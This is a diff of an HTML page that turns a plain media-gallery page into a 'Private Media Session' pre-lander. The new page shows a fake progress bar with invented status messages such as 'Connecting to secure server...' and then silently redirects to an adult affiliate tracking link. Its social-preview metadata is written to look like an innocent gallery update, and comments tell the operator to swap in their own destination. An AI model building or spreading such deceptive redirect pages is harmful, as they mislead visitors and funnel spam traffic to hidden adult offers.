@@ -1,158 +1,222 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- ================= PAGE TITLE ================= -->
+  <title>Private Media Session</title>
 
-  <title>Latest Media Highlights</title>
+  <!-- ================= FAVICON ================= -->
+  <link rel="icon" href="https://i.imgur.com/J2yTKbe.jpeg">
 
-  <!-- ================= OPEN GRAPH ================= -->
+  <!-- ================= PRELOAD OG IMAGE ================= -->
+  <link rel="preload" as="image" href="https://i.imgur.com/J2yTKbe.jpeg">
 
-  <meta property="og:type" content="website">
+  <!-- ================= OG PREVIEW ================= -->
+  <!-- GANTI title/description/image sesuai kebutuhan -->
+  <meta property="og:title" content="✨Live Session, Gallery Update" />
+  <meta property="og:description" content="A Small Collections Preview" />
+  <meta property="og:image" content="https://i.imgur.com/J2yTKbe.jpeg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:type" content="website" />
 
-  <meta property="og:title" content="📸 Latest Media Highlights">
+  <!-- WAJIB ganti kalau domain berubah -->
+  <meta property="og:url" content="https://room5.lovegallery.online" />
 
-  <meta property="og:description" content="Fresh media collections and featured highlights available now.">
-
-  <meta property="og:url" content="https://gallery1.lovegallery.online/">
-
-  <!-- PREVIEW IMAGE -->
-  <meta property="og:image"
-  content="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?q=80&w=1200&auto=format&fit=crop">
-
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-
-  <!-- TWITTER -->
-
-  <meta name="twitter:card" content="summary_large_image">
-
-  <meta name="twitter:title"
-  content="📸 Latest Media Highlights">
-
-  <meta name="twitter:description"
-  content="Fresh media collections and featured highlights available now.">
-
-  <meta name="twitter:image"
-  content="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?q=80&w=1200&auto=format&fit=crop">
-
-  <meta name="theme-color" content="#ffffff">
+  <!-- ================= BASIC SEO ================= -->
+  <meta name="robots" content="index, follow" />
+  <meta name="theme-color" content="#0f0f0f" />
 
   <style>
-
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
 
-    body{
-      background:#f4f4f4;
-      font-family:Arial,sans-serif;
-      color:#111;
-      line-height:1.6;
-      padding:25px;
+    body {
+      background: #0f0f0f;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
     }
 
-    .card{
-      max-width:760px;
-      margin:auto;
-      background:#fff;
-      border-radius:18px;
-      overflow:hidden;
-      box-shadow:0 10px 35px rgba(0,0,0,.08);
+    .container {
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+      padding: 20px;
     }
 
-    .hero{
-      width:100%;
-      height:400px;
-      object-fit:cover;
-      display:block;
+    /* ================= SPINNER ================= */
+
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 5px solid rgba(255,255,255,0.08);
+      border-top: 5px solid #00ffcc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 25px;
     }
 
-    .content{
-      padding:28px;
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
     }
 
-    h1{
-      font-size:32px;
-      margin-bottom:12px;
+    /* ================= TEXT ================= */
+
+    h2 {
+      font-size: 22px;
+      margin-bottom: 14px;
+      font-weight: 600;
     }
 
-    .meta{
-      font-size:14px;
-      opacity:.65;
-      margin-bottom:22px;
+    p {
+      font-size: 13px;
+      opacity: 0.65;
+      margin-top: 10px;
     }
 
-    p{
-      margin-bottom:18px;
-      color:#333;
+    /* ================= PROGRESS BAR ================= */
+
+    .progress-wrapper {
+      width: 100%;
+      height: 10px;
+      background: #1d1d1d;
+      border-radius: 999px;
+      overflow: hidden;
+      margin-top: 15px;
     }
 
-    .button{
-      display:inline-block;
-      margin-top:10px;
-      background:#111;
-      color:#fff;
-      padding:14px 22px;
-      border-radius:12px;
-      text-decoration:none;
-      font-weight:600;
+    .progress {
+      width: 0%;
+      height: 100%;
+      border-radius: 999px;
+      background: linear-gradient(90deg, #00ffcc, #00c3ff);
+      transition: width 0.25s ease;
     }
 
-    .footer{
-      margin-top:28px;
-      padding-top:18px;
-      border-top:1px solid #eee;
-      font-size:13px;
-      opacity:.6;
+    .percent {
+      margin-top: 10px;
+      font-size: 14px;
+      opacity: 0.8;
     }
-
   </style>
-
 </head>
 
 <body>
 
-  <div class="card">
+  <div class="container">
 
-    <img
-      class="hero"
-      src="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?q=80&w=1200&auto=format&fit=crop"
-      alt="Media Preview"
-    >
+    <!-- ================= SPINNER ================= -->
 
-    <div class="content">
+    <div class="loader"></div>
 
-      <h1>Latest Media Highlights</h1>
+    <!-- ================= STATUS TEXT ================= -->
 
-      <div class="meta">
-        Updated today • Featured collections
-      </div>
+    <h2 id="status">Preparing your content...</h2>
 
-      <p>
-        Explore the latest featured media collections,
-        visual highlights, and newly updated gallery previews.
-      </p>
+    <!-- ================= PROGRESS ================= -->
 
-      <p>
-        This page contains a curated selection of
-        recent visual content updates available for viewing.
-      </p>
-
-      <a class="button" href="#">
-        Continue Viewing
-      </a>
-
-      <div class="footer">
-        © 2026 Media Highlights
-      </div>
-
+    <div class="progress-wrapper">
+      <div class="progress" id="progress"></div>
     </div>
 
+    <div class="percent" id="percent">0%</div>
+
+    <p>Please wait a moment</p>
+
   </div>
+
+  <script>
+
+    // ==================================================
+    // ================= SETTINGS =======================
+    // ==================================================
+
+    // GANTI ke link tujuan kamu
+    const REDIRECT_URL = "https://dfbjbie.pixelsau.com/s/3cd7b37fd681f?track=ATHENA&preland=Adult";
+
+    // Total waktu loading (ms)
+    const TOTAL_DURATION = 5000;
+
+    // ==================================================
+    // ================= ELEMENT ========================
+    // ==================================================
+
+    const progressBar = document.getElementById("progress");
+    const percentText = document.getElementById("percent");
+    const statusText = document.getElementById("status");
+
+    // ==================================================
+    // ================= LOADING SYSTEM =================
+    // ==================================================
+
+    let progress = 0;
+
+    const interval = setInterval(() => {
+
+      // Smooth progress
+      progress += 4;
+
+      // Batas max
+      if (progress > 100) {
+        progress = 100;
+      }
+
+      // ================= UPDATE UI =================
+
+      progressBar.style.width = progress + "%";
+      percentText.innerText = Math.floor(progress) + "%";
+
+      // ================= DYNAMIC STATUS =================
+
+      if (progress < 25) {
+        statusText.innerText = "Preparing your content...";
+      }
+      else if (progress < 50) {
+        statusText.innerText = "Connecting to secure server...";
+      }
+      else if (progress < 75) {
+        statusText.innerText = "Loading media assets...";
+      }
+      else if (progress < 95) {
+        statusText.innerText = "Almost ready...";
+      }
+      else {
+        statusText.innerText = "Launching...";
+      }
+
+      // ================= REDIRECT =================
+
+      if (progress >= 100) {
+
+        clearInterval(interval);
+
+        setTimeout(() => {
+
+          // Redirect lebih smooth
+          window.location.replace(REDIRECT_URL);
+
+        }, 500);
+      }
+
+    }, TOTAL_DURATION / 25);
+
+  </script>
 
 </body>
 </html>
